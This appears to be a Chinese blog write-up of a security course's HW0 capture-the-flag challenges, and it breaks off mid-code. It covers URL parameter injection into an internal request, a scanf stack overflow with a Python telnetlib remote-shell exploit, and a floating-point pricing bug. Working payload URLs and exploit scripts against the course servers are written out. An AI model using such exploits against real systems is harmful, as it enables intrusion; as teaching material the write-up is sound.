+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">authServer.get(<span class="string">"/"</span>, (request, response) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; data, givemeflag &#125; = request.query;</span><br><span class="line">    <span class="keyword">const</span> userInfo = <span class="built_in">JSON</span>.parse(data);</span><br><span class="line">    <span class="keyword">if</span> (givemeflag === <span class="string">"yes"</span> &amp;&amp; userInfo.admin) <span class="comment">// You don't need to be cute to get the flag ouo!</span></span><br><span class="line">        response.send(FLAG);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        response.send(&#123;</span><br><span class="line">            username: <span class="string">`Hellowo, <span class="subst">$&#123;userInfo.username&#125;</span><span class="subst">$&#123;userInfo.admin ? <span class="string">"&lt;(_ _)&gt;"</span> : <span class="string">""</span>&#125;</span>!`</span>,</span><br><span class="line">            imageLinks: cuteOnlyImages.map(<span class="function"><span class="params">link</span> =&gt;</span> userInfo.cute ? link : <span class="string">"javascript:alert('u are not cute oAo!')"</span>)</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">authServer.listen(<span class="number">9487</span>, <span class="string">"127.0.0.1"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>往上看一下如何成為 admin，首先在 4~8 行可以看到 username 跟 cute 有型別跟內容的限制，10~13 行限制 username 只能使用 alphanumeric，15~17 行會直接把 username 及 cute 不做其他處理直接放進 URL 裡面，而且在正常情況下 <code>givemeflag</code> 永遠不可能是 yes，掌握了 source 跟 sink，這裏顯然是要污染 17 行的 URL，讓 app 去 authServer 把 flag 拿回來：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">'/auth'</span>, (request, response) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; username, cute &#125; = request.query;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> username !== <span class="string">"string"</span> || <span class="keyword">typeof</span> cute !== <span class="string">"string"</span> ||</span><br><span class="line">        username === <span class="string">""</span> || !cute.match(<span class="string">"(true|false)$"</span>)) &#123;</span><br><span class="line">        response.send(&#123; <span class="attr">error</span>: <span class="string">"Whaaaat owo?"</span> &#125;);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (username.match(<span class="regexp">/[^a-z0-9]+/i</span>)) &#123;</span><br><span class="line">        response.send(&#123; <span class="attr">error</span>: <span class="string">"`Username` should contain only letters &amp; numbers, owo."</span> &#125;);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> userInfo = <span class="string">`&#123;"username":"<span class="subst">$&#123;username&#125;</span>","admin":false,"cute":<span class="subst">$&#123;cute&#125;</span>&#125;`</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> api = <span class="string">`http://127.0.0.1:9487/?data=<span class="subst">$&#123;userInfo&#125;</span>&amp;givemeflag=no`</span>;</span><br><span class="line">    http.get(api, resp =&gt; &#123;</span><br><span class="line">        resp.setEncoding(<span class="string">"utf-8"</span>);</span><br><span class="line">        <span class="keyword">if</span> (resp.statusCode === <span class="number">200</span>)</span><br><span class="line">            resp.on(<span class="string">'data'</span>, data =&gt; response.send(data));</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            response.send(&#123; <span class="attr">error</span>:  <span class="string">"qwq..."</span> &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)</span><br><span class="line">app.listen(<span class="number">8787</span>, <span class="string">"0.0.0.0"</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>首先已經知道 username 只能放 alphanumeric，這一個 regex 看起來沒問題，機會不大，另外一個輸入就是 cute，根據剛剛 source code 的結果可以知道輸入只能是 “true” 或是 “false”，但 javascript 的 match 是在 String 找到符合 pattern 的子字串，所以照 source code 的寫法，只要能夠在字串尾端找得到 “true” 或是 “false” 就好了，例如</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">"this is not true"</span>.match(<span class="string">"(true|false)$"</span>) !== <span class="literal">null</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="string">"this is false"</span>.match(<span class="string">"(true|false)$"</span>) !== <span class="literal">null</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="comment">//正確應該是這條</span></span><br><span class="line"><span class="string">"true is false, false is true"</span>.match(<span class="string">"^(true|false)$"</span>) === <span class="literal">null</span></span><br><span class="line"><span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<p>所以 cute 是可以注入的，可以先透過這個方法拿到 admin，如果我們的 cute 填入 <code>true,&quot;admin&quot;:true}&amp;a={true</code>，那 userinfo 就會被我們改成</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"username"</span>:<span class="string">"nini"</span>,<span class="string">"admin"</span>:<span class="literal">false</span>,<span class="string">"cute"</span>:<span class="literal">true</span>,<span class="string">"admin"</span>:<span class="literal">true</span>&#125;&amp;a=&#123;<span class="literal">true</span>&#125;</span><br><span class="line"><span class="comment">//最後被訪問的 URL 也就變成</span></span><br><span class="line"><span class="comment">//http://127.0.0.1:9487/?data=&#123;"username":"nini","admin":false,"cute":true,"admin":true&#125;&amp;a=&#123;true&#125;&amp;givemeflag=no</span></span><br></pre></td></tr></table></figure>
+
+<p>這裡的 <code>&amp;a</code> 的 <code>&amp;</code> 要先進行一次 urlencode 不然會被 <code>app.get(&#39;/auth&#39;</code> 直接拿來用，訪問 <a href="https://owohub.zoolab.org/auth?username=nini&cute=true,%22admin%22:true}%26a={true]" target="_blank" rel="noopener">https://owohub.zoolab.org/auth?username=nini&amp;cute=true,%22admin%22:true}%26a={true</a>，就能成功變成 admin 了：</p>
+<img src="/tw/2020-%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW0-Write-up/webadmin.png" class="">
+
+<p>下一個問題是要怎麼把 <code>givemeflag</code> 改成 “yes”，再發起請求的時給予多個同名的 GET parameters，server 會取最後一個，我們注入的點在 <code>givemeflag=no</code> 之前，所以沒辦法直接蓋掉，這裡可以用 pound sign 來把後半段的 GET parameter 直接變成 URL 的 anchor，得到最後的 cute</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">true,"admin":true&#125;&amp;givemeflag=yes#true</span><br><span class="line"><span class="comment">//最後被訪問的 URL 也就變成</span></span><br><span class="line"><span class="comment">//http://127.0.0.1:9487/?data=&#123;"username":"nini","admin":false,"cute":true,"admin":true&#125;&amp;givemeflag=yes#true&#125;&amp;givemeflag=no</span></span><br></pre></td></tr></table></figure>
+
+<p>一樣 <code>&amp;</code> 跟 <code>#</code> 要先 urlencode，最後的 payload :<br><a href="https://owohub.zoolab.org/auth?username=nini&cute=true,%22admin%22:true}%26givemeflag=yes%23true" target="_blank" rel="noopener">https://owohub.zoolab.org/auth?username=nini&amp;cute=true,%22admin%22:true}%26givemeflag=yes%23true</a></p>
+<p>flag: <code>FLAG{owo_ch1wawa_15_th3_b35t_uwu!!!}</code></p>
+<h1 id="CafeOverflow"><a href="#CafeOverflow" class="headerlink" title="CafeOverflow"></a>CafeOverflow</h1><h2 id="Recon-2"><a href="#Recon-2" class="headerlink" title="Recon"></a>Recon</h2><p>可以先 nc 跟 remote 服務互動一下，看起來是很簡單的程式:</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ nc hw00.zoolab.org 65534</span><br><span class="line">What is your name : nini</span><br><span class="line">Hello, nini</span><br></pre></td></tr></table></figure>
+
+<p>可以試試看塞長一點的名字，然後他就 crash 了，如果這一步做不到也沒關係，我們可以進行靜態分析：</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ python -c <span class="string">"print('a'*0x2000)"</span> | nc hw00.zoolab.org 65534</span><br><span class="line">What is your name : %</span><br></pre></td></tr></table></figure>
+
+<p>先 file 他，可以知道是 ELF 64位元的執行檔，而且 debug symbol 沒有 strip</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ file CafeOverflow</span><br><span class="line">CafeOverflow: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a51ce7f3649d54780b84a937f14af5b4e8a50f51, <span class="keyword">for</span> GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure>
+
+<p>雖然可以用諸如 IDA、Ghidra 之類的 decompiler，但這裡還是用比較簡單的 disassembler 來做題目就好了</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -s 用來把除了 assembly 之類的訊息也印出來，比較好找到一些常數</span></span><br><span class="line"><span class="comment"># -M 用來指定 objdump 顯示 intel syntax 風格的 assembly</span></span><br><span class="line">$ objdump -d -s  CafeOverflow  -M intel | less</span><br></pre></td></tr></table></figure>
+
+<p>main 裡面用來吃輸入的地方使用的是 scanf，scanf 的第一個參數會放在 rdi 上，因為我們有下 -s，往上滑到最上面就可以找到 0x40203d，對應字串 %s，因為 %s 沒有限制輸入大小，所以這裡有一個 buffer overflow 的漏洞</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401239:       48 8d 45 f0             lea    rax,[rbp-0x10]</span><br><span class="line">40123d:       48 89 c6                mov    rsi,rax</span><br><span class="line">401240:       48 8d 3d f6 0d 00 00    lea    rdi,[rip+0xdf6]        # 40203d &lt;_IO_stdin_used+0x3d&gt;</span><br><span class="line">401247:       b8 00 00 00 00          mov    eax,0x0</span><br><span class="line">40124c:       e8 1f fe ff ff          call   401070 &lt;__isoc99_scanf@plt&gt;</span><br></pre></td></tr></table></figure>
+
+<p>題目很好心的有提供開 shell 的 function，叫做 func1，就在 main 的上面：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000401176 &lt;func1&gt;:</span><br><span class="line">  401176:       55                      push   rbp</span><br><span class="line">  401177:       48 89 e5                mov    rbp,rsp</span><br><span class="line">  40117a:       48 83 ec 10             sub    rsp,0x10</span><br><span class="line">  40117e:       48 89 c0                mov    rax,rax</span><br><span class="line">  401181:       48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax</span><br><span class="line">  401185:       48 b8 fe ca fe ca fe    movabs rax,0xcafecafecafecafe</span><br><span class="line">  40118c:       ca fe ca</span><br><span class="line">  40118f:       48 39 45 f8             cmp    QWORD PTR [rbp-0x8],rax</span><br><span class="line">  401193:       75 22                   jne    4011b7 &lt;func1+0x41&gt;</span><br><span class="line">  401195:       48 8d 3d 68 0e 00 00    lea    rdi,[rip+0xe68]        # 402004 &lt;_IO_stdin_used+0x4&gt;</span><br><span class="line">  40119c:       e8 8f fe ff ff          call   401030 &lt;puts@plt&gt;</span><br><span class="line">  4011a1:       48 8d 3d 68 0e 00 00    lea    rdi,[rip+0xe68]        # 402010 &lt;_IO_stdin_used+0x10&gt;</span><br><span class="line">  4011a8:       e8 93 fe ff ff          call   401040 &lt;system@plt&gt;</span><br><span class="line">  4011ad:       bf 00 00 00 00          mov    edi,0x0</span><br><span class="line">  4011b2:       e8 c9 fe ff ff          call   401080 &lt;exit@plt&gt;</span><br><span class="line">  4011b7:       48 8d 3d 5a 0e 00 00    lea    rdi,[rip+0xe5a]        # 402018 &lt;_IO_stdin_used+0x18&gt;</span><br><span class="line">  4011be:       e8 6d fe ff ff          call   401030 &lt;puts@plt&gt;</span><br><span class="line">  4011c3:       90                      nop</span><br><span class="line">  4011c4:       c9                      leave</span><br><span class="line">  4011c5:       c3                      ret</span><br></pre></td></tr></table></figure>
+
+<h2 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h2><p>那我們試試看直接跳上去會發生什麼事：</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#首先製造一個檔案包含 300 個 0x401176 (func1 的位置)</span></span><br><span class="line"><span class="comment">#用來當作輸入</span></span><br><span class="line">$ python3 -c <span class="string">"import struct; f=open('payload','wb'); f.write(struct.pack('&lt;Q',0x401176)*300) ;f.write(b'\n'); f.close()"</span></span><br><span class="line"><span class="comment">#把輸入 pipe 給 CafeOverflow</span></span><br><span class="line">$ cat payload | ./CafeOverflow</span><br><span class="line">What is your name : Hello, v@</span><br><span class="line">Not quite right</span><br><span class="line">Not quite right</span><br><span class="line">Not quite right</span><br><span class="line">Not quite right</span><br><span class="line">Not quite right</span><br><span class="line">Not quite right</span><br><span class="line">Not quite right</span><br><span class="line">Not quite right</span><br><span class="line">...略</span><br></pre></td></tr></table></figure>
+
+<p>看來還有條件沒達成，回頭看一下 func1 會發現其實他有檢查 rax 是否等於 0xcafecafecafecafe，當然，rax 是可控的，但這邊提供一個快一點的解法，就是直接跳到 rax 的檢查之後就好了，在這裡就是 0x4011a1 這個位置</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000401176 &lt;func1&gt;:</span><br><span class="line">  401176:       55                      push   rbp</span><br><span class="line">  401177:       48 89 e5                mov    rbp,rsp</span><br><span class="line">  40117a:       48 83 ec 10             sub    rsp,0x10</span><br><span class="line">  40117e:       48 89 c0                mov    rax,rax</span><br><span class="line">  401181:       48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax</span><br><span class="line">  401185:       48 b8 fe ca fe ca fe    movabs rax,0xcafecafecafecafe</span><br><span class="line">  40118c:       ca fe ca</span><br><span class="line">  40118f:       48 39 45 f8             cmp    QWORD PTR [rbp-0x8],rax</span><br><span class="line">  401193:       75 22                   jne    4011b7 &lt;func1+0x41&gt;</span><br><span class="line">  401195:       48 8d 3d 68 0e 00 00    lea    rdi,[rip+0xe68]        # 402004 &lt;_IO_stdin_used+0x4&gt;</span><br><span class="line">  40119c:       e8 8f fe ff ff          call   401030 &lt;puts@plt&gt;</span><br><span class="line">  4011a1:       48 8d 3d 68 0e 00 00    lea    rdi,[rip+0xe68]        # 402010 &lt;_IO_stdin_used+0x10&gt;</span><br><span class="line">  4011a8:       e8 93 fe ff ff          call   401040 &lt;system@plt&gt;</span><br><span class="line">  4011ad:       bf 00 00 00 00          mov    edi,0x0</span><br><span class="line">  4011b2:       e8 c9 fe ff ff          call   401080 &lt;exit@plt&gt;</span><br><span class="line">  4011b7:       48 8d 3d 5a 0e 00 00    lea    rdi,[rip+0xe5a]        # 402018 &lt;_IO_stdin_used+0x18&gt;</span><br><span class="line">  4011be:       e8 6d fe ff ff          call   401030 &lt;puts@plt&gt;</span><br><span class="line">  4011c3:       90                      nop</span><br><span class="line">  4011c4:       c9                      leave</span><br><span class="line">  4011c5:       c3                      ret</span><br></pre></td></tr></table></figure>
+
+<p>所以再試一次</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#一樣造一個檔案做輸入</span></span><br><span class="line">$ python3 -c <span class="string">"import struct; f=open('payload','wb'); f.write(struct.pack('&lt;Q',0x4011a1)*300) ;f.write(b'\n'); f.close()"</span></span><br><span class="line"><span class="comment"># 這裡用 - 把 stdin 接回來，如果成功拿到 shell 才能夠互動</span></span><br><span class="line">$ cat payload - | ./CafeOverflow</span><br><span class="line">What is your name : Hello, �@</span><br><span class="line">whoami <span class="comment">#terminal 會卡在這裡，要自己打 whoami</span></span><br><span class="line">terrynini38514</span><br></pre></td></tr></table></figure>
+
+<p>看來 local 成功拿到 shell 了，來試試看拿 remote shell，因為是 remote 的關係，為求穩定，這裡就不繼續用 cat 了，改用 telnetlib 來跟遠端 socket 溝通</p>
+<figure class="highlight py"><figcaption><span>payload.py </span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">r = telnetlib.Telnet(<span class="string">"hw00.zoolab.org"</span>, <span class="number">65534</span>)</span><br><span class="line"></span><br><span class="line">print(r.read_until(<span class="string">b'What is your name : '</span>))</span><br><span class="line"></span><br><span class="line">payload = struct.pack(<span class="string">'&lt;Q'</span>,<span class="number">0x4011a1</span>)*<span class="number">300</span> + <span class="string">b'\n'</span></span><br><span class="line"></span><br><span class="line">r.write(payload)</span><br><span class="line">print(r.read_until(<span class="string">b'\n'</span>))</span><br><span class="line"></span><br><span class="line">r.interact()</span><br></pre></td></tr></table></figure>
+
+<p>然後我們就 pwn 下 server 了</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ python3 payload.py</span><br><span class="line">b<span class="string">'What is your name : '</span></span><br><span class="line">b<span class="string">'Hello, \xa1@\n'</span></span><br><span class="line">whoami</span><br><span class="line">Cafeoverflow</span><br><span class="line">cat /home/`whoami`/flag</span><br><span class="line">flag&#123;c0ffee_0verfl0win6_from_k3ttle_QAQ&#125;</span><br></pre></td></tr></table></figure>
+
+<p>flag: <code>flag{c0ffee_0verfl0win6_from_k3ttle_QAQ}</code></p>
+<h1 id="The-Floating-Aquamarine"><a href="#The-Floating-Aquamarine" class="headerlink" title="The Floating Aquamarine"></a>The Floating Aquamarine</h1><h2 id="Recon-3"><a href="#Recon-3" class="headerlink" title="Recon"></a>Recon</h2><p>這題的考點應該很明顯是浮點數誤差，原因應該很好理解，拿出這個剛學 C 的時候練習過的程式，i 一直加 0.1 是不會剛好等於 1.0 的，因為 IEEE754 的 0.1 不是 0.1：</p>
+<figure class="highlight c"><figcaption><span>WTF.c </span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">float</span> i = <span class="number">0</span> ; i != <span class="number">1.0</span> ; i += <span class="number">0.1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"not yet"</span>);</span><br><span class="line">        <span class="keyword">if</span> ( i &gt; <span class="number">1.0</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"What the..."</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h2><p>所以只要能夠在買賣之間造成價差就好了，問題是怎麼找到，因為我也想不到一個很讚的方法，例如說什麼挑這兩個數字是質數啊，還是挑的數字 factor 不要有 5,2 啊什麼的，我是沒想出來，有什麼很酷炫的數學方法再告訴我，這題較快的方法就爆破或是靠感覺（？）， 總之我是靠感覺把 100000000 拆成兩個質數就過了，令人難以接受，當然這裡可以輕鬆寫個 C 來幫助你，既然浮點數誤差算起來麻煩，那就不要算，就讓他誤差就好了：</p>
+<figure class="highlight c"><figcaption><span>Buffett.c </span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cassert&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cin</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::getenv;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">max</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> ALL_STONE = <span class="number">100000000</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">float</span> PRICE = <span class="number">88.88</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">float</span> RICH = <span class="number">3000.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::setprecision(<span class="number">16</span>);</span><br><span class="line">  <span class="keyword">float</span> max_gain = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; ALL_STONE ; i++)&#123;</span><br><span class="line">        <span class="keyword">float</span> gain = -PRICE*(ALL_STONE) + PRICE*i + PRICE*(ALL_STONE-i);</span><br><span class="line">        <span class="keyword">if</span> (gain &gt; max_gain)&#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; i &lt;&lt; <span class="string">" "</span> &lt;&lt; ALL_STONE-i &lt;&lt; <span class="string">" "</span>&lt;&lt; gain &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            max_gain = gain;</span><br><span class="line">        &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">6 99999994 1024</span></span><br><span class="line"><span class="comment">96646572 3353428 1088</span></span><br><span class="line"><span class="comment">96654844 3345156 1120</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<p>所以就買獲利 1120 的那組就對了，然後我的買法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">100000000</span><br><span class="line">-99999989</span><br><span class="line">-11</span><br><span class="line">100000000</span><br><span class="line">-99999989</span><br><span class="line">-11</span><br><span class="line">100000000</span><br><span class="line">-99999989</span><br><span class="line">-11</span><br><span class="line">Wow! You have 3025.68 dollars!</span><br><span class="line">Well done! Here is your flag: FLAG&#123;floating_point_error_https:&#x2F;&#x2F;0.30000000000000004.com&#x2F;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>flag: <code>FLAG{floating_point_error_https://0.30000000000000004.com/}</code></p>
+<h1 id="解密一下"><a href="#解密一下" class="headerlink" title="解密一下"></a>解密一下</h1><h2 id="Recon-4"><a href="#Recon-4" class="headerlink" title="Recon"></a>Recon</h2><p>這題的中文看起來有點煩躁，總之<code>正轉換</code>跟<code>逆轉換</code>基本上就只是把 bytes 跟 list 互換，沒有誤用的話對加密的過程沒有危害，<code>_加密</code>這個 function 實作的是 <a href="https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm" target="_blank" rel="noopener">Tiny Encryption Algorithm</a>，差別是出題者的 Delta 用了不同的數值，不能識別出是這個算法也沒關係，仔細看的話，完全是可以自己寫出解密函式的，可以嘗試餵輸入給<code>_加密</code>看看，從過程跟結果看起來這應該是一個有用的加密 function，加上密文過短，針對加密方法本身的攻擊在這裡看起來不太可能：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> time <span class="keyword">as</span> 時間</span><br><span class="line"><span class="keyword">import</span> random <span class="keyword">as</span> 隨機</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> List <span class="keyword">as</span> 陣列</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BufferedReader <span class="keyword">as</span> 緩衝讀取者</span><br><span class="line"><span class="keyword">from</span> forbiddenfruit <span class="keyword">import</span> curse <span class="keyword">as</span> 詛咒</span><br><span class="line"></span><br><span class="line">整數 = int</span><br><span class="line">詛咒(整數, <span class="string">"從位元組"</span>, 整數.from_bytes)</span><br><span class="line">詛咒(整數, <span class="string">"到位元組"</span>, 整數.to_bytes)</span><br><span class="line">位元組 = bytes</span><br><span class="line">詛咒(位元組, <span class="string">"十六進制"</span>, 位元組.hex)</span><br><span class="line">詛咒(位元組, <span class="string">"加入"</span>, 位元組.join)</span><br><span class="line">詛咒(緩衝讀取者, <span class="string">"讀取"</span>, 緩衝讀取者.read)</span><br><span class="line">隨機.種子 = 隨機.seed</span><br><span class="line">隨機.給我隨機位元們 = 隨機.getrandbits</span><br><span class="line">時間.現在 = 時間.time</span><br><span class="line">列印 = <span class="keyword">print</span></span><br><span class="line">打開 = open</span><br><span class="line">範圍 = range</span><br><span class="line">長度 = len</span><br><span class="line">大端序 = <span class="string">'big'</span></span><br><span class="line">讀取位元組 = <span class="string">'rb'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> 正轉換<span class="params">(資料, 大小=<span class="number">4</span>)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> [整數.從位元組(資料[索引:索引+大小], 大端序) <span class="keyword">for</span> 索引 <span class="keyword">in</span> 範圍(<span class="number">0</span>, 長度(資料), 大小)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> 逆轉換<span class="params">(資料, 大小=<span class="number">4</span>)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b''</span>.加入([元素.到位元組(大小, 大端序) <span class="keyword">for</span> 元素 <span class="keyword">in</span> 資料])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_</span>加密<span class="params">(向量: 陣列[整數], 金鑰: 陣列[整數])</span>:</span></span><br><span class="line">    累加, 得優塔, 遮罩 = <span class="number">0</span>, <span 